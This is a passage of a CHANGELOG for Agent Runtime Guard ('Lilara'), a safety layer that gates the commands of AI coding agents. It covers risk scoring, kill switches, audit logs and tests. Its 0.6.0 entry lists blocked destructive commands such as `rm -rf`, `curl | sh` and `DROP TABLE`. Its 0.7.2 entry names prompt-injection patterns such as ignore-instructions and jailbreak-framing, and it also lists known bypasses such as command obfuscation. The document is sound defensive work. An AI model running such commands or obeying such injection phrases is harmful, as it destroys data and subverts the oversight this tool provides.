- CLAUDE_CODE_HANDOFF.md: CI check step count corrected from "20" to "24"; broken `STATUS.md` link replaced with `artifacts/status/status-summary.txt`.
- `hookLog` and `rateLimitCheck` now route through `LILARA_STATE_DIR` when set (back-compat fallback preserved).
- `LILARA_DECISION_JOURNAL=0` added as primary kill switch for decision journal; `ARG_DECISION_JOURNAL=0` kept as deprecated alias.
- `workflow-router.js` `primaryStack` priority aligned to `action-planner.js` (explicit input wins over auto-detected).

---

## [1.0.0] — 2026-04-23

### Added
- **B.1 — Auto-allow-once**: `grantAutoAllowOnce(key)`, `consumeAutoAllowOnce(key)`, `hasAutoAllowOnce(key)` in `runtime/policy-store.js`. Only policies with a pending suggestion (approvalCount ≥ 3) may receive a single-use grant. `runtime.decide()` checks and consumes the token for non-critical, non-high-risk commands; emits `auto-allow-once=consumed` in explanation. CLI verb: `lilara-cli.sh runtime auto-allow-once '<policy-key>'`.
- **B.2 — Trajectory-driven routing**: `getSessionTrajectory()` in `runtime/session-context.js` returns `{ recentEscalations, recentReviews, lastDecisionAt }` bounded to a configurable window (`LILARA_TRAJECTORY_WINDOW_MIN`, default 30 min). `runtime/decision-engine.js` nudges actions up one step (allow→route, route→require-review, require-review→escalate) when `recentEscalations >= LILARA_TRAJECTORY_THRESHOLD` (default 3); learned-allow and auto-allow-once sources are exempt; nudge appears in `explanation` and new `trajectoryNudge` result field. Sprint R3 acceptance items now closed.
- Tests for B.1 and B.2 in `scripts/check-runtime-core.sh` and B.1 CLI test in `scripts/check-runtime-cli.sh`.
- **C.1 — OWASP Agentic Top 10 2026 coverage matrix**: `references/owasp-agentic-coverage.md` maps each ASI01–ASI10 risk to specific files or explicit NOT COVERED / PARTIAL / DEFERRED verdicts. `scripts/check-owasp-coverage.sh` enforces all 10 rows exist, each has a verdict, and every referenced file exists. Wired into CI and `lilara-cli.sh check`.
- **C.2 — Path-sensitivity classifier**: `classifyPathSensitivity(path)` in `claude/hooks/hook-utils.js` returns `low | medium | high` based on SSH keys, cloud credentials, vault paths, `.env` files, infra dirs, etc. `dangerous-command-gate.js` computes it from `targetPath` and passes `pathSensitivity` to `runtime.decide()`; `runtime/risk-score.js` adds +1 (medium) or +2 (high) to risk score; hook prints "Sensitive path detected" when ≥ medium. Advisory only — does not block unilaterally.
- **C.3 — Kill switch**: `LILARA_KILL_SWITCH=1` env var causes `runtime.decide()` to return `action: "block"` for every input immediately, regardless of risk score. Documented in `claude/hooks/README.md` with full env-var reference table. Test case added to `check-runtime-core.sh`.
- **C.4 — Runtime decision latency bench**: `scripts/bench-runtime-decision.sh` runs 1000 representative `decide()` calls and prints p50/p95/p99. Platform-aware ceiling: 5ms on Linux CI, 500ms on Windows (file-system overhead). Documented in `references/full-power-status.md`. Wired into CI (`LILARA_BENCH_P99_MS=10`) and `lilara-cli.sh check`.
- **C.5 — JSONL audit trail**: `hookLog()` in `claude/hooks/hook-utils.js` now emits structured JSONL (`{"ts":"...","hook":"...","event":"...","label":"..."}`) instead of tab-separated text. `lilara-cli.sh log --since '<timestamp>'` filter added to select entries by ISO timestamp using inline Node.js.

### Release Summary
- Sprint R3 fully closed: auto-allow-once lifecycle and trajectory-driven routing complete all R3 acceptance criteria.
- OWASP Agentic Top 10 2026 coverage mapped and machine-verified.
- Kill switch, path-sensitivity classifier, JSONL audit trail, and latency bench complete community-informed improvement cycle.
- CI workflow now covers all 18 check groups (was 8 at v0.9.0).

---

## [0.9.0] — 2026-04-23

### Added (Tier A — self-maintaining hardening follow-up)
- `scripts/check-fixture-count.sh` now also validates the fixture count in the `CHANGELOG.md` current section, closing the gap where the docstring claimed CHANGELOG coverage but the grep was absent.
- `scripts/lilara-cli.sh check` now preflights `node` on PATH and exits 2 with a clear message (including the known LMStudio bundled path hint) when `node` is absent; removes the previous silent-failure mode for node-dependent check groups.

### Changed (Tier A — self-maintaining hardening follow-up)
- `scripts/check-harness-support.sh` Supported-harness assertion now uses a single anchored regex (`\| *<Harness> *\|[^|]*Supported`) and fails loudly if a Supported label is dropped; the previous `|| true` softness is removed.

### Added (Sprint R3 opener — hook fidelity + multi-harness honesty)
- `classifyCommandPayload()` in `claude/hooks/hook-utils.js` — in-process payload classification (A/B/C) for command strings, mirroring `classify-payload.sh` tier logic without spawning a shell.
- `readSessionRisk()` in `claude/hooks/hook-utils.js` — explicit session-risk reader wrapping `runtime.getSessionRisk()` for hook integration.
- Dedicated `escalation` workflow lane in `runtime/workflow-router.js` — action `escalate` now routes to `lane=escalation`, `suggestedSurface=security-reviewer`, `suggestedTarget=human-gate`; remains human-gated with `enforcementAction=block`.
- `scripts/check-fixture-count.sh` — verifies fixture `.input` count matches `README.md` and `references/full-power-status.md`.

### Changed (Sprint R3 opener)
- `claude/hooks/dangerous-command-gate.js` now computes `payloadClass` and `sessionRisk` in the hook process and passes both to `runtime.decide()`, closing the hook/engine fidelity gap from R2; hook stderr now prints payload class (if non-A), session risk (if non-zero), workflow route lane (if non-direct), and an explicit ESCALATION ROUTE marker when action is `escalate`.
- `scripts/check-runtime-core.sh` extended with three new cases: escalate lane routing, payloadClass-C-to-review routing, sessionRisk bump reflected in decision explanation, and in-process `classifyCommandPayload` classification.
- `scripts/check-runtime-cli.sh` extended with escalate-lane routing test via `runtime explain`.
- `scripts/status-summary.sh` now prints disk-count summary lines after the [Agents], [Rules], and [Skills] sections, making uncovered drift immediately visible.
- `scripts/check-status-docs.sh` now validates per-tool table row counts in `references/per-tool-apply-status.md` against parity-matrix values.
- `scripts/lilara-cli.sh check` and `scripts/status-summary.sh` [Verification] block now include `check-fixture-count.sh`.
- `references/runtime-autonomy-roadmap.md` updated to record Sprint R3 opener as landed and explicitly call out what remains open in Sprint R3.

### Added (W3 — multi-harness honesty)
- Stub harness directories `codex/`, `clawcode/`, `antegravity/` — each with `README.md` (explicit NOT YET SUPPORTED marker + integration contract sketch) and `COMPATIBILITY_NOTES.md` (full list of unknowns and path to support).
- `scripts/check-harness-support.sh` — verifies the Harness Support Matrix in README.md, stub directory presence and NOT YET SUPPORTED markers, wizard rejection behavior, and per-tool-apply-status Planned Harnesses section.

### Changed (W3 — multi-harness honesty)
- `README.md` now includes a "Harness Support Matrix" section distinguishing Supported (Claude Code, OpenCode, OpenClaw) from Planned (Codex, Claw Code, antegravity) harnesses.
- `scripts/setup-wizard.sh` now exits non-zero with a clear "NOT YET SUPPORTED" message for planned harness tool names (`codex`, `clawcode`, `antegravity`) and a pointer to the Harness Support Matrix; completely unknown tool names also exit non-zero.
- `scripts/check-setup-wizard.sh` extended to assert that planned harness tool names produce the non-zero exit + not-yet-supported message.
- `scripts/generate-apply-status.sh` extended with a "Planned Harnesses" section listing Codex, Claw Code, and antegravity with explicit `status=planned, wiring=not-implemented` entries.
- `scripts/lilara-cli.sh check` and `scripts/status-summary.sh` [Verification] block now include `check-harness-support.sh`.

### Added (earlier in Unreleased)


- `references/runtime-autonomy-roadmap.md` to define the next improvement cycle around bounded autonomy, risk scoring, local learning, and self-maintaining runtime behavior.
- `runtime/decision-engine.js`, `runtime/risk-score.js`, and `runtime/decision-journal.js` as the first autonomy-layer scaffold.
- `runtime/workflow-router.js` for initial workflow-lane recommendations across review, checks, setup, payload, wiring, and direct execution paths.
- `runtime/policy-store.js` and `runtime/session-context.js` for learned local policy and rolling session-risk state.
- `runtime/promotion-guidance.js` for structured lifecycle-aware policy promotion guidance (stages: new, approaching, eligible, promoted, dismissed, ineligible) with concrete CLI hints surfaced in hook output, runtime explain, and runtime state.
- `scripts/check-runtime-core.sh` to verify runtime decisioning primitives, learned policy behavior, session context, and promotion guidance.
- `scripts/generate-status-artifact.sh` and `scripts/check-status-artifact.sh` to produce and verify a unified repo status artifact with metadata.

### Changed
- `claude/hooks/hook-utils.js` now exposes a lightweight runtime decision entry point for hook integration.
- `scripts/status-summary.sh`, `README.md`, `references/full-power-status.md`, and `references/superiority-evidence.md` now include status-artifact-aware self-maintenance coverage, and the artifact generator now avoids recursive self-check execution during generation.
- `claude/hooks/dangerous-command-gate.js` now consults the runtime decision layer and surfaces learned-allow versus block/escalate behavior.
- `runtime/policy-store.js` now promotes repeated approvals into pending learned-policy suggestions instead of silently relying on implicit state only, and reviewed-default lifecycle history is now surfaced as both raw timestamps and compact per-decision summaries.
- `references/runtime-autonomy-roadmap.md` and `references/full-power-status.md` now record Sprint R2 policy-lifecycle auditability as complete and identify Sprint R3 routing/workflow autonomy as the next runtime step.
- `lilara-cli.sh` now exposes runtime state, suggestion acceptance, suggestion dismissal, explicit approval recording, and decision explanation flows.
- runtime decisions now load per-project runtime config from `lilara.config.json`, including trust posture, protected branches, and sensitive path patterns.
- runtime context discovery now auto-detects project root and git branch, and decision actions now include bounded orchestration states like `require-review`, `require-tests`, and `modify`.
- workflow-style runtime actions now carry action plans with suggested commands, review types, or safer modification hints for hooks and CLI surfaces.
- action plans now adapt to local approval/suggestion history so recurring patterns can surface stronger policy-promotion guidance instead of staying static.
- `runtime/decision-engine.js` now attaches structured `promotionGuidance` (stage, guidance text, CLI hint) to every decision output.
- `runtime/decision-engine.js` and `scripts/runtime-state.js` now surface initial workflow routing guidance (`workflow-lane`, `workflow-surface`, `workflow-target`, `workflow-command`) for common low-risk paths, including review and audit flows alongside checks, setup, payload, wiring, a source-file-to-checks default, strict-trust escalation of source-file work toward review, tool-aware routing for direct settings/hook edits, and payload-class-aware review defaults for Class B/C work.
- `runtime/action-planner.js` now includes `promotionHint` in action plans when the pattern has promotion history.
- `claude/hooks/dangerous-command-gate.js` now surfaces promotion stage and CLI hints in hook stderr output.
- `scripts/runtime-state.js` now shows promotion stage, guidance, CLI hints, reviewed-default lifecycle timing (`created-at`, `eligible-at`, accepted/dismissed), and a compact lifecycle summary in `explain` output, plus explicit `promote` commands and lifecycle summaries in state output.
- `scripts/check-runtime-core.sh` and `scripts/check-runtime-cli.sh` now verify promotion guidance in decisions, explicit promotion flows, and CLI output.
- `lilara-cli.sh check` and `status-summary.sh` now include runtime-core verification.

---

## [0.8.1] — 2026-04-22

### Fixed
- **MODULES.md** — expanded from 3 hooks to all 12 hooks plus 2 shared libraries and 2 pattern configs. Each entry now documents event type and `LILARA_ENFORCE=1` blocking behavior.
- **SECURITY_MODEL.md** — hook contract updated to document: 5 MB stdin cap, `LILARA_ENFORCE=1` exit-code-2 blocking mode, rate limiting via `rateLimitCheck()`, and which hooks support blocking.
- **risk-register.md** — copied from main repo and expanded from 10 to 15 risks covering dangerous shell commands, prompt injection, hook file tampering, hook spawn rate, and command obfuscation.
- **audit-notes.md** — copied from main repo to close documentation gap.

---

## [0.8.0] — 2026-04-21

### Added
- `check-config-integration.sh` for end-to-end verification of `generate-config.sh`, config-driven `install-local.sh`, and `wire-hooks.sh --check`.
- `check-hook-edge-cases.sh` for empty stdin, oversized payload, malformed config, and multi-line dangerous-command coverage.
- `generate-apply-status.sh`, `generate-parity-report.sh`, and `generate-superiority-evidence.sh` to reduce documentation drift.
- `check-status-docs.sh` to guard key count claims and generated report sync.
- `references/final-comparison-audit.md` to record the two-round closeout audit against both internal docs and the upstream baseline.

### Changed
- `lilara-cli.sh check` and `status-summary.sh` now include config integration, hook edge cases, status-doc sync, and quantified superiority verification.
- `references/per-tool-apply-status.md`, `references/parity-report.md`, and `references/superiority-evidence.md` now follow semi-generated anti-drift workflows.
- Sprint 4 is now closed, and the repo status is documented as full parity plus measured superiority.

### Release Summary
- Full upstream content parity is now complete: 38/38 agents, 87/87 rules, and 156/156 skills adopted.
- Agent Runtime Guard now carries 57 ECC-only extensions beyond upstream.
- Runtime/usability verification is now enforced by 17 verification layers, including installation, config integration, hook edge cases, apply-status sync, superiority evidence, and status-doc sync.
- This release closes the parity-to-superiority project scope and marks the start of any future work as a new improvement cycle.

---

## [0.7.3] — 2026-04-20

### Fixed
- **classify-payload.sh** — Class B and C detection now uses multi-word / specific phrases to eliminate false positives. "internal combustion engine" no longer classifies as B; "customer service FAQ" no longer classifies as C. High-risk action wording section (additive, non-blocking) retains broad single-word matching by design.
- **audit-local.sh** — URL scan narrowed from bare `https?://` to fetch/download context (`curl`, `wget`, `fetch`, `http.get`, `axios.get`, `requests.get` + URL). Documentation links and example URLs no longer trigger false positives.
- **rules/python/security.md** — Anti-patterns table corrected: `random.token_hex()` (which doesn't exist in the `random` module) replaced with `random.randint()` as the BAD example, `secrets.token_hex()` / `secrets.token_bytes()` as the GOOD example.
- **strategic-compact.js** — Added `hookLog("strategic-compact", "INFO", ...)` when a compaction suggestion fires. Events now appear in `hook-events.log` when `LILARA_HOOK_LOG=1`.
- **skills/README.md** — Updated from listing 6 skills to documenting all 130 across 10 categories with a full category overview table.

---

## [0.7.2] — 2026-04-20

### Security
- **dangerous-patterns.json** — added 4 prompt injection patterns (medium severity): ignore-instructions, override-policy, exfiltrate-data, jailbreak-framing. Detected by `dangerous-command-gate.js` in warn mode (or block in `LILARA_ENFORCE=1`).
- **dangerous-command-gate.js** — replaced `.find()` with `.filter()` + sort by severity. Highest-severity pattern now always wins regardless of JSON ordering. Prevents silent severity downgrade when a medium pattern appears before a critical one.
- **SECURITY_MODEL.md** — added "Known Limitations" section documenting: command obfuscation bypass, rate limiter TOCTOU race, and heuristic-only prompt injection detection.

### Performance
- **build-reminder.js** — added `rateLimitCheck("build-reminder")`. All four PreToolUse hooks now participate in rate limiting.

### Testing
- **3 new DCG prompt injection fixtures** — `dcg-pi-ignore-instructions`, `dcg-pi-override-policy`, `dcg-pi-jailbreak-framing`. Total: 54 fixtures, 54/54 passing.

### Correctness
- **wire-hooks.sh `--verify`** — added `dangerous-command-gate.js` to the verification list (was the only hook missing).
- **hook-utils.js `rateLimitCheck`** — added detailed TOCTOU race condition comment with analysis of why it is accepted as benign.

---

## [0.7.1] — 2026-04-20

### Security (Tier 1 bug fixes from multi-model review)
- **secret-warning.js** — removed duplicated `readStdin`/`collectText` functions that lacked the 5 MB cap. Now imports `readStdin`, `collectText`, and `ENFORCE` directly from `hook-utils.js`. Oversized payloads are now correctly rejected before secret scanning begins.
- **setup-wizard.sh** — replaced hardcoded `/tmp/ecc_wizard_config.json` with `mktemp` to eliminate the symlink attack vector (same class of bug fixed in `strategic-compact.js` in v0.6.0).
- **instinct-utils.js** — `ensureDir()` now passes `mode: 0o700` to `mkdirSync`. The `~/.lilara/instincts/` directory is no longer world-readable.
- **install-local.sh** — `minimal_files()` now includes all hook files (`session-start.js`, `session-end.js`, `strategic-compact.js`, `memory-load.js`, `pr-notifier.js`). Previously, a minimal install wired all hooks from `hooks.json` but only copied 10 of 15, causing runtime failures.

---

## [0.7.0] — 2026-04-20

### Added
- **setup-wizard.sh** — Interactive onboarding wizard (5 questions → ready-to-run install command + starter lilara.config.json). Supports `--non-interactive` mode for automation.
- **check-skills.sh** — Validates all 130 skill files for required H1 heading and Trigger/Purpose section. `--errors-only` flag for CI. Zero errors across all 129 skills.
- **lilara-cli.sh** — Unified CLI entry point consolidating 14 individual scripts into one interface with subcommands: `install`, `setup`, `audit`, `check`, `fixtures`, `integrity`, `status`, `review`, `classify`, `redact`, `wire`, `log`, `version`.

### Observability
- **hook-utils.js: hookLog()** — Append-only event log at `~/.lilara/hook-events.log`. Activated by `LILARA_HOOK_LOG=1`. Records metadata only (hook name, timestamp, event type, detection label — never payload content or commands). Wired into `dangerous-command-gate.js`, `git-push-reminder.js`, and `secret-warning.js`.
- **lilara-cli.sh log** — View log with `--tail N` or clear it with `--clear`.

### Performance
- **hook-utils.js: rateLimitCheck()** — File-based token-bucket rate limiter (60 token capacity, 30 tokens/s refill). Prevents 3000+ Node.js process spawns per minute during high-velocity sessions. Wired into all three PreToolUse hooks. Disable with `LILARA_RATE_LIMIT=0`.

### Audit
- **session-end.js instinct fields** — Verified: `extractSafeMetadata()` reads only `tool_name` and `event_type`; `trigger`/`behavior` fields are hardcoded placeholders filled by user on review. No auto-extracted session content, commands, or file paths captured.

---

## [0.6.0] — 2026-04-20

### Security
- **dangerous-command-gate.js** (new hook) — blocks `rm -rf`, `git push --force`, `curl | sh`, `DROP TABLE`, `npx -y`, `sudo rm`, and 13 other dangerous shell command patterns. `LILARA_ENFORCE=1` blocks critical/high-severity commands; default mode warns.
- **dangerous-patterns.json** — 17 extensible patterns with severity levels (critical/high/medium) and reasons. Add project-specific patterns without editing the hook.
- **git-push-reminder.js** — upgraded from warn-only to enforce-capable. `LILARA_ENFORCE=1` now blocks force pushes entirely.
- **secret-patterns.json** — fixed misleading `"The hook never blocks"` comment. Block mode with `LILARA_ENFORCE=1` was always supported but undocumented.
- **strategic-compact.js** — counter file moved from `/tmp/ecc-session-counter.json` to `~/.lilara/session-counter.json` to eliminate Linux symlink attack risk.

### Added
- **hook-utils.js** — shared hook utilities: `readStdin` with 5 MB cap (prevents memory exhaustion), `commandFrom`, `collectText`, `ENFORCE`. Eliminates 9 identical copies of these functions across all hooks.
- **verify-hooks-integrity.sh** — SHA-256 baseline for all 15 hook files. Run `--update` after intentional changes; commit baseline to git so tampered hooks are visible in diffs.
- **scripts/hooks-baseline.sha256** — initial baseline for integrity checking.

### Fixed
- **quality-gate.js** — removed duplicate `.rs` key (cargo clippy only); unified to `cargo clippy && cargo test`. Added `.c` and `.h` file support.
- **quality-gate.js** — now imports `readStdin` from `hook-utils.js` instead of inline copy.

### Testing
- **run-fixtures.sh** — expanded from 2 fixture sections to 5: classify, secret-warning, dangerous-command-gate, git-push-reminder, redact-payload.
- **45 fixtures** total (was 22): 26 classify (20 new approval-boundary + 6 existing), 8 secret-warning (3 new prompt-injection), 7 dangerous-command-gate (all new), 4 git-push-reminder (all new), 6 redact-payload (all new).

### Rules
- **rust/security.md** — 67 → 333 lines. Added OWASP map, path traversal, command injection, JWT, rate limiting, secrecy crate, anti-patterns table.
- **kotlin/security.md** — 71 → 336 lines. Added OWASP map, open redirect, JWT verification, coroutine safety, log injection, anti-patterns table.
- **csharp/security.md** — 68 → 312 lines. Added OWASP map, XSS (Razor/Blazor), open redirect, AES-GCM, JWT config, anti-patterns table.
- **cpp/security.md** — 98 → 307 lines. Added OWASP map, format strings, RAII patterns, path traversal, fuzzing setup, compiler security flags, anti-patterns table.

### Install
- **install-local.sh** — reads `lilara.config.json` from target directory; respects `profile` and `languages` fields. New hooks added to `minimal_files()`.
- **audit-examples.sh** — Pass 2 added: flags dangerous patterns inside GOOD-labeled code blocks (previously only scanned prose).
- **redact-payload.sh** — added IPv4 address redaction pattern.

---

## [0.5.0] — 2026-04-19

### Rules
- 12 thin rule files rewritten to production depth (150–400 lines each).
- Affected: common/patterns, common/performance, common/coding-style, common/security, common/testing, common/development-workflow, python/coding-style, python/testing, java/security, golang/security, swift/security, web/coding-style.

### Infrastructure
- hooks.json: /ABS_PATH/ placeholder guidance added.
- wire-hooks.sh: generates ready-to-paste settings.json snippet.
- audit-examples.sh: initial version for prose scanning.
- run-fixtures.sh: initial 22-fixture test runner.

---

## [0.4.0] — 2026-04-18

### Added
- 23 thin agent/skill files deepened to production quality.
- secret-patterns.json: expanded from 5 to 23 patterns.
- install-local.sh: profiles (minimal/rules/agents/skills/full), --auto language detection, --list dry-run.
- lilara.config.json.example: per-project config template.
- agents/index.json, agents/ROUTING.md: agent routing and dispatch guide.
- classify-payload.sh, redact-payload.sh, review-payload.sh: payload protection pipeline.
- modules/daemon-pack/: scoped background helper patterns.

---

## [0.3.0] — 2026-04-17

### Added
- Initial 38 agents, 48 rules, 60 skills from ECC v1.10.0 source review.
- Phase 1/2/3 policy structure (trusted-agents, MCP, shell, plugins, browser, notifications, installers, wrappers, daemons).
- 9 hooks: secret-warning, build-reminder, git-push-reminder, quality-gate, strategic-compact, memory-load, session-start, session-end, pr-notifier.
- scripts: install-local.sh, audit-local.sh, check-registries.sh, smoke-test.sh, status-summary.sh.
- SECURITY_MODEL.md, MODULES.md, DECISIONS.md.
- references/: phase policies, upstream-sync, vendor-policy, import-checklist, payload guides.
